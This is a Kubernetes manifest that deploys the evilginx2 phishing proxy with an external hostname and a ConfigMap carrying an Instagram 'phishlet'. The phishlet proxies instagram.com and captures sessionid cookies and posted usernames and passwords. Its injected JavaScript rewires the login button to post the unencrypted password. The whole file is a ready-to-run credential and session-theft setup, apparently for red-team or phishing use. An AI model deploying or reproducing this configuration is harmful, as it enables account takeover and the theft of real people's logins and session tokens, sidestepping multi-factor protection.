---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: evilginx2
  namespace: evilginx2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: evilginx2
  strategy:
    type: Recreate
  template:
    metadata:
      labels:
        app: evilginx2
    spec:
      containers:
        - name: evilginx2
          image: ghcr.io/l50/docker-evilginx2:latest
          command:
            ["/bin/evilginx", "-p", "/phishlets", "-c", "/config", "-developer"]
          ports:
            - containerPort: 53
              protocol: UDP
            - containerPort: 80
              protocol: TCP
            - containerPort: 443
              protocol: TCP
          envFrom:
            - configMapRef:
                name: evilginx-env
          volumeMounts:
            - mountPath: /phishlets
              name: phishlets-pvc
            - mountPath: /config
              name: config-pvc
          tty: true
          stdin: true
      restartPolicy: Always
      volumes:
        - name: phishlets-pvc
          persistentVolumeClaim:
            claimName: phishlets-pvc
        - name: config-pvc
          persistentVolumeClaim:
            claimName: config-pvc
        - name: phishlets-cm
          configMap:
            name: phishlets-cm

---
apiVersion: v1
kind: ConfigMap
metadata:
  name: evilginx-env
  namespace: evilginx2
data:
  TZ: America/Denver
  EXTERNAL_HOSTNAME: evilginx2.techvomit.xyz

---
apiVersion: v1
kind: ConfigMap
metadata:
  name: phishlets-env
  namespace: evilginx2
data:
  instagram.yaml: |
    author: '@charlesbel'
    min_ver: '2.3.0'
    proxy_hosts:
      - phish_sub: 'www'
        orig_sub: 'www'
        domain: 'instagram.com'
        session: true
        is_landing: true
      - phish_sub: 'm'
        orig_sub: 'm'
        domain: 'instagram.com'
        session: true
        is_landing: false
    sub_filters:
      - triggers_on: 'www.instagram.com'
        orig_sub: 'www'
        domain: 'instagram.com'
        search: 'https://{hostname}/'
        replace: 'https://{hostname}/'
        mimes: ['text/html', 'application/json']
      - triggers_on: 'm.instagram.com'
        orig_sub: 'm'
        domain: 'instagram.com'
        search: 'https://{hostname}/'
        replace: 'https://{hostname}/'
        mimes: ['text/html', 'application/json', 'application/x-javascript']
      - triggers_on: 'm.instagram.com'
        orig_sub: 'm'
        domain: 'instagram.com'
        search: '''{domain}'';'
        replace: '''{domain}'';'
        mimes: ['text/html', 'application/json', 'application/x-javascript']
    auth_tokens:
      - domain: '.instagram.com'
        keys: ['sessionid','.*,regexp']
    credentials:
      username:
        key: 'user'
        search: '(.*)'
        type: 'post'
      password:
        key: 'unenc_password'
        search: '(.*)'
        type: 'post'
    login:
      domain: 'www.instagram.com'
      path: '/accounts/login'
    js_inject:
      - trigger_domains: ["www.instagram.com"]
        trigger_paths: ["/accounts/login"]
        trigger_params: []
        script: |
          function lp(){
            var submit = document.querySelectorAll('button[type=submit]')[0];
            submit.setAttribute("onclick", "sendPass()");
            return;
          }
          function sendPass(){
            var password = document.getElementsByName("password")[0].value;
            var xhr = new XMLHttpRequest();
            xhr.open("POST", '/accounts/login/ajax/', true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("unenc_password="+encodeURIComponent(password));
            return;
          }
          setTimeout(function(){ lp(); }, 1000);
